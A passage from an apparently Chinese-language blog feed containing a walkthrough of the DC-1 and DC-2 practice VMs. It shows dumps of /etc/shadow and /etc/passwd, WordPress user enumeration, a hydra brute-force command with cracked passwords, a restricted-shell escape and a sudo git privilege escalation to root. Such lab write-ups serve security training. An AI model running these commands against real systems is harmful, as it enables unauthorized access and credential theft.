class="line">Debian-exim:!:17946:0:99999:7:::</span><br><span class="line">statd:*:17946:0:99999:7:::</span><br><span class="line">messagebus:*:17946:0:99999:7:::</span><br><span class="line">sshd:*:17946:0:99999:7:::</span><br><span class="line">mysql:!:17946:0:99999:7:::</span><br><span class="line">flag4:$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80:17946:0:99999:7:::</span><br><span class="line"><span class="meta">#</span><span class="bash"> </span></span><br></pre></td></tr></table></figure>
+
+<p>接着看一下密码文件</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> cat /etc/passwd</span></span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">Debian-exim:x:101:104::/var/spool/exim4:/bin/false</span><br><span class="line">statd:x:102:65534::/var/lib/nfs:/bin/false</span><br><span class="line">messagebus:x:103:107::/var/run/dbus:/bin/false</span><br><span class="line">sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>先去home下查看一下flag4</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /home/flag4</span></span><br><span class="line">cd /home/flag4</span><br><span class="line"><span class="meta">#</span><span class="bash"> ls</span></span><br><span class="line">ls</span><br><span class="line">flag4.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> cat flag4.txt</span></span><br><span class="line">cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&#x27;s not that easy.  Or maybe it is?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>提醒要用root查看。</p>
+<p>在shadow中发现flag4是一个账户。可能是ssh账户，不知道咋破解。。看了大佬的文章后知道密码是orange。。。emm其实没啥用，flag4.txt在root文件夹下</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /root</span></span><br><span class="line">cd /root</span><br><span class="line"><span class="meta">#</span><span class="bash"> ls</span></span><br><span class="line">ls</span><br><span class="line">thefinalflag.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> cat the?????????.???</span> </span><br><span class="line">cat the?????????.???</span><br><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you&#x27;ve enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br></pre></td></tr></table></figure>
+
+<p>DC-1至此就结束了</p>
+<blockquote>
+<p>小结：</p>
+<p>1、进行扫描，找到靶机的ip及其开放的端口</p>
+<p>2、探测开启了什么web服务</p>
+<p>3、查询相关服务的漏洞进行利用，得到可用账户</p>
+<p>4、利用可用账户进入数据库来查看管理员密码或修改密码</p>
+<p>5、反弹shell并提权</p>
+</blockquote>
+<h3 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h3><p>靶机ip：192.168.126.136</p>
+<p>先扫一下ip<code>arp-scan -l</code>之后用nmap来扫端口<code>nmap -v -A 192.168.126.136</code>或<code>nmap -sV -p- 192.168.126.136</code>或<code>nmap -sS -Pn -A -p- -n 192.168.126.136</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">└─# nmap -sV -p- 192.168.126.136</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-04 15:44 CST</span><br><span class="line">Nmap scan report for dc-2 (192.168.126.136)</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)</span><br><span class="line">MAC Address: 00:50:56:32:1D:98 (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 8.80 seconds</span><br></pre></td></tr></table></figure>
+
+<p>开放了80和7744端口，可以发现，ssh对应的默认22端口关闭了，切换成了7744</p>
+<p><code>whatweb -v 192.168.126.136</code>或<code>whatweb 192.168.126.136</code>查看一下web服务</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">└─# whatweb 192.168.126.136    </span><br><span class="line">http://192.168.126.136 [301 Moved Permanently] Apache[2.4.10], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.10 (Debian)], IP[192.168.126.136], RedirectLocation[http://dc-2/]</span><br><span class="line">http://dc-2/ [200 OK] Apache[2.4.10], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.10 (Debian)], IP[192.168.126.136], JQuery[1.12.4], MetaGenerator[WordPress 4.7.10], PoweredBy[WordPress], Script[text/javascript], Title[DC-2 &amp;#8211; Just another WordPress site], UncommonHeaders[link], WordPress[4.7.10]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发现是<strong>wordpress</strong></p>
+<blockquote>
+<p>WordPress是一种使用PHP语言和MySQL数据库开发的博客平台</p>
+<p>思路：</p>
+<p>​    根据CMS做进一步操作：</p>
+<p>​        1、成熟的CMS一般自身不会有漏洞，可以关注其插件的问题；</p>
+<p>​        2、尝试得知CMS版本，做进一步的漏洞搜索；</p>
+<p>​        3、搜索相关CMS的测试工具。</p>
+</blockquote>
+<p>尝试访问一下，发现直接访问ip之后url栏出现了域名，且访问不到，判断是域名不解析，在hosts文件中加入对应ip和域名即可</p>
+<p><code>vi /etc/hosts</code>插入👇</p>
+<table>
+<thead>
+<tr>
+<th>192.168.126.136</th>
+<th>dc-2</th>
+</tr>
+</thead>
+</table>
+<p>再次访问即可。</p>
+<p>在网页中发现了flag，点击出现如下内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Flag</span><br><span class="line"></span><br><span class="line">Flag 1:</span><br><span class="line"></span><br><span class="line">Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</span><br><span class="line">More passwords is always better, but sometimes you just can’t win them all.</span><br><span class="line">Log in as one to see the next flag.</span><br><span class="line">If you can’t find it, log in as another.</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>cewl，发现是一个kali自带的密码生成工具</p>
+<p>用法可参考<a href="https://www.codercto.com/a/44828.html">https://www.codercto.com/a/44828.html</a></p>
+</blockquote>
+<p>使用<code>cewl -w dc2_passwords.txt http://dc-2</code>通过页面信息生成密码</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">└─# cewl -w dc2_passwords.txt http://dc-2</span><br><span class="line">CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br></pre></td></tr></table></figure>
+
+<p>可以用nikto工具扫描网站结构，找到wp-login.php（登录界面）</p>
+<p><code>nikto -h dc-2 -o nikto-dc-2.txt</code></p>
+<blockquote>
+<p>Nikto是一款开源的（GPL）网页服务器扫描器，它可以对网页服务器进行全面的多种扫描，包含超过3300种有潜在危险的文件CGIs；超过625种服务器版本；超过230种特定服务器问题。<br>Nikto是一个Perl语言编写的扫描器。<br>优点：小巧便捷。<br>弱点：功能有限、命令行工具通病，结果不便查看。</p>
+<p>用法参考：<a href="https://zhuanlan.zhihu.com/p/124246499">https://zhuanlan.zhihu.com/p/124246499</a></p>
+</blockquote>
+<p>接下来用wpscan扫一波</p>
+<blockquote>
+<p>WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。</p>
+<p>用法参考：<a href="https://www.cnblogs.com/WangYiqiang/p/9490869.html">https://www.cnblogs.com/WangYiqiang/p/9490869.html</a></p>
+</blockquote>
+<p><code>wpscan --url http://dc-2 --enumerate u</code>或<code>wpscan --ignore-main-redirect --url 192.168.85.137 --enumerate u --force</code>或<code>wpscan --url http://dc-2/ -e u</code></p>
+<p>扫出来三个用户</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] jerry</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line"> |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] tom</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>将这三个用户写入dc-2users.txt。</p>
+<p>使用生成的password和用户名通过hydra进行爆破</p>
+<blockquote>
+<p>hydra是著名黑客组织thc的一款开源的暴力密码破解工具，可以在线破解多种协议密码，并且还支持生成密码字典，有GUI图形和命令行两种非常容易上手。</p>
+<p>用法参考：<a href="https://www.cnblogs.com/mchina/archive/2013/01/01/2840815.html">https://www.cnblogs.com/mchina/archive/2013/01/01/2840815.html</a></p>
+</blockquote>
+<p>命令<code>hydra -L dc-2users.txt -P dc2_passwords.txt dc-2 http-form-post &#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#39;</code></p>
+<blockquote>
+<p>-l ——&gt; 表示单个用户名（使用-L表示用户名列表）<br>-P ——&gt; 表示使用以下密码列表<br>http-post-form ——&gt; 表示表单的类型<br>/ dvwa / login-php ——&gt; 是登录页面URL<br>username ——&gt; 是输入用户名的表单字段<br>^ USER ^ ——&gt; 告诉Hydra使用字段中的用户名或列表<br>password是输入密码的表单字段（可以是passwd，pass等）<br>^ PASS ^ ——&gt; 告诉Hydra使用提供的密码列表</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">└─# hydra -L dc-2users.txt -P dc2_passwords.txt dc-2 http-form-post &#x27;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#x27;</span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-04 16:18:12</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 714 login tries (l:3/p:238), ~45 tries per task</span><br><span class="line">[DATA] attacking http-post-form://dc-2:80/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location</span><br><span class="line">[80][http-post-form] host: dc-2   login: tom   password: parturient</span><br><span class="line">[80][http-post-form] host: dc-2   login: jerry   password: adipiscing</span><br><span class="line">1 of 1 target successfully completed, 2 valid passwords found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-04 16:18:58</span><br></pre></td></tr></table></figure>
+
+<p>也可以用wpscan来爆破出可以登录的用户名密码</p>
+<p><code>wpscan --url http://dc-2 -U dc-2users.txt -P dc2_passwords.txt</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[+] Performing password attack on Xmlrpc against 3 user/s</span><br><span class="line">[SUCCESS] - jerry / adipiscing                                                                                         [SUCCESS] - tom / parturient  </span><br></pre></td></tr></table></figure>
+
+<p>先去登录一下看看，发现只有jerry用户登录后发现了flag2</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Flag 2:</span><br><span class="line">If you can&#39;t exploit WordPress and take a shortcut, there is another way.</span><br><span class="line">Hope you found another entry point.</span><br></pre></td></tr></table></figure>
+
+<p>尝试ssh远程登录，发现只有tom能登录成功</p>
+<p><code>ssh tom@192.168.85.137 -p 7744</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">└─# ssh tom@192.168.126.136 -p 7744                                                                                                                                                                           255 ⨯</span><br><span class="line">The authenticity of host &#x27;[192.168.126.136]:7744 ([192.168.126.136]:7744)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:ZbyT03GNDQgEmA5AMiTX2N685NTzZuOoyMDIA+DW1qU.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;[192.168.126.136]:7744&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">tom@192.168.126.136&#x27;s password: </span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">tom@DC-2:~$ </span><br></pre></td></tr></table></figure>
+
+<p>输入几个常见命令后发现：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tom@DC-2:~$ whoami</span><br><span class="line">-rbash: whoami: command not found</span><br></pre></td></tr></table></figure>
+
+<p>出现了-rbash<del>….这啥啊也没见过啊</del></p>
+<blockquote>
+<p>参考文章：</p>
+<p><a href="https://www.anquanke.com/post/id/173159">https://www.anquanke.com/post/id/173159</a></p>
+<p><a href="https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/">https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/</a></p>
+<p><a href="https://www.cnblogs.com/zaqzzz/p/12075132.html">https://www.cnblogs.com/zaqzzz/p/12075132.html</a></p>
+</blockquote>
+<p>输入<code>BASH_CMDS[a]=/bin/sh;a</code>然后回车再输入<code>/bin/bash</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tom@DC-2:~$ BASH_CMDS[a]=/bin/sh;a</span><br><span class="line"><span class="meta">$</span><span class="bash"> /bin/bash</span></span><br><span class="line">tom@DC-2:~$ ls</span><br><span class="line">flag3.txt  usr</span><br><span class="line">tom@DC-2:~$ cat flag3.txt</span><br><span class="line">bash: cat: command not found</span><br></pre></td></tr></table></figure>
+
+<p>之后输入<code>export PATH=$PATH:/bin/</code>或<code>export PATH=/usr/sbin:/usr/bin:/sbin:/bin</code></p>
+<blockquote>
+<p>PATH就是定义/bin:/sbin:/usr/bin等这些路径的变量，其中冒号为目录间的分割符。</p>
+<p>可以用export -p查看当前所有的shell赋予程序的环境变量</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tom@DC-2:~$ cat flag3.txt</span><br><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure>
+
+<p>好家伙，又一个提示出来了<code>su</code>那就切换到jerry用户</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tom@DC-2:~$ su jerry</span><br><span class="line">Password: </span><br><span class="line">jerry@DC-2:/home/tom$ ls</span><br><span class="line">ls: cannot open directory .: Permission denied</span><br><span class="line">jerry@DC-2:/home/tom$ cd ../</span><br><span class="line">jerry@DC-2:/home$ cd jerry</span><br><span class="line">jerry@DC-2:~$ ls</span><br><span class="line">flag4.txt</span><br><span class="line">jerry@DC-2:~$ cat flag4.txt</span><br><span class="line">Good to see that you&#x27;ve made it this far - but you&#x27;re not home yet. </span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line">No hints here - you&#x27;re on your own now.  :-)</span><br><span class="line">Go on - git outta here!!!!</span><br></pre></td></tr></table></figure>
+
+<p>又一个提示：git</p>
+<p>查看sudo配置文件，发现git是root不用密码可以运行，接着进行git提权。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jerry@DC-2:~$ sudo -l</span><br><span class="line">Matching Defaults entries for jerry on DC-2:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User jerry may run the following commands on DC-2:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/git</span><br></pre></td></tr></table></figure>
+
+<p>输入<code>sudo git -p help</code>（注意调整窗口使一页不能显示完</p>
+<p>在最下边输入<code>!/bin/bash</code> </p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jerry@DC-2:~$ sudo git -p help</span><br><span class="line">usage: git [--version] [--help] [-C &lt;path&gt;] [-c name=value]</span><br><span class="line">           [--exec-path[=&lt;path&gt;]] [--html-path] [--man-path] [--info-path]</span><br><span class="line">           [-p|--paginate|--no-pager] [--no-replace-objects] [--bare]</span><br><span class="line">           [--git-dir=&lt;path&gt;] [--work-tree=&lt;path&gt;] [--namespace=&lt;name&gt;]</span><br><span class="line">           &lt;command&gt; [&lt;args&gt;]</span><br><span class="line"></span><br><span class="line">The most commonly used git commands are:</span><br><span class="line">   add        Add file contents to the index</span><br><span class="line">   bisect     Find by binary search the change that introduced a bug</span><br><span class="line">   branch     List, create, or delete branches</span><br><span class="line">   checkout   Checkout a branch or paths to the working tree</span><br><span class="line">   clone      Clone a repository into a new directory</span><br><span class="line">   commit     Record changes to the repository</span><br><span class="line">   diff       Show changes between commits, commit and working tree, etc</span><br><span class="line">   fetch      Download objects and refs from another repository</span><br><span class="line">   grep       Print lines matching a pattern</span><br><span class="line">   init       Create an empty Git repository or reinitialize an existing one</span><br><span class="line">   log        Show commit logs</span><br><span class="line">   merge      Join two or more development histories together</span><br><span class="line">!/bin/bash</span><br><span class="line">root@DC-2:/home/jerry# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>提权成功（此时可以修改root账户密码</p>
+<p>cat一下final-flag.txt</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@DC-2:/# cd ~                                                                                                       root@DC-2:~# ls                                                                                                         final-flag.txt                                                                                                         root@DC-2:~# cat final-flag.txt                                                                                          __    __     _ _       _                    _                                                                            / / /\ \ \___| | |   __| | ___  _ __   ___  / \                                                                          \ \/  \/ / _ \ | |  / _` |/ _ \| &#x27;_ \ / _ \/  /                                                                          \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/                                                                           \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/                                                                                                                                                                        </span><br><span class="line">Congratulatons!!!                                                                                                       A special thanks to all those who sent me tweets                                                                       and provided me with feedback - it&#x27;s all greatly                                                                       appreciated.                                                                                                           If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>内网靶机练习</category>
       </categories>
   </entry>
   <entry>
